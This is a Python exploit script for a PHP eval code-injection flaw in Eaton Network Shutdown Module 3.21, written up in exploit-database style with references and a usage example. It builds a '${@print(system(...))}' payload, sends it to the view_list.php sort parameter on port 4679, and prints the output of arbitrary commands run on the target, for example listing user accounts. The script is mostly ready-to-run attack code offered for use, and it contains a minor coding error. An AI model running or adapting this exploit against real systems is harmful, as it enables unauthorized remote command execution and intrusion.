#!/usr/bin/env python
#
# Quick 'n' Dirty - Metasploit module didn't do it for me
# 2013 - Filip Waeytens - http://www.wsec.be
#
# Usage Example:
##~  $ python eaton.py 192.168.1.9 "net user"
#
#User accounts for \\
#
#-------------------------------------------------------------------------------
#Guest                    LocalAdmin              
#The command completed with one or more errors.
#
# Exploit Title: Eaton shutdown module php eval exploit
# Date: 5 dec2013
# Exploit Author: Filip Waeytens
# Vendor Homepage: powerquality.eaton.com
# Software Link: http://powerquality.eaton.com/Products-services/Power-Management/Software-Drivers/network-shutdown.asp
# Version: 3.21
# Tested on: WIN
#References:
###Exploit Database: 23006
###Secunia Advisory ID: 49103
###Bugtraq ID: 54161
###Related OSVDB ID: 83200 83201
###Packet Storm: http://packetstormsecurity.org/files/118420/Network-Shutdown-Module-3.21-Remote-PHP-Code-Injection.html
#
 
import httplib
import urllib
import sys
import BeautifulSoup
 
#### First argument is the target IP - port defaults to 4679
 
targetip = sys.argv[1]
command = sys.argv[2]
targetport=4679
 
 
#### if a command has spaces: put between double quotes, the next lines strip the quotes
 
if command.startswith('"') and string.endswith('"'):
    command = command[1:-1]
 
#### build the urL to request
     
baserequest = "/view_list.php?paneStatusListSortBy="
wrappedcommand="${@print(system(\""+command+"\"))}"
ue_command = urllib.quote_plus(wrappedcommand)
 
#### send request
conn = httplib.HTTPConnection(targetip+":"+str(targetport))
conn.request("GET", baserequest+ue_command)
r1 = conn.getresponse()
#print "Getting answer: "
#print r1.status, r1.reason
#print "sent http://"+targetip+":"+str(targetport)+baserequest+ue_command
data1 = r1.read()
 
 
#### extract answer
 
soup = BeautifulSoup.BeautifulSoup(data1)
for p in soup.findAll("p"):
            #print dir(p)
            #strip first line
             
            result = p.getText().split("Warning")[0]
            print result.replace("Multi-source information on the power devices suppying the protected server","",1)
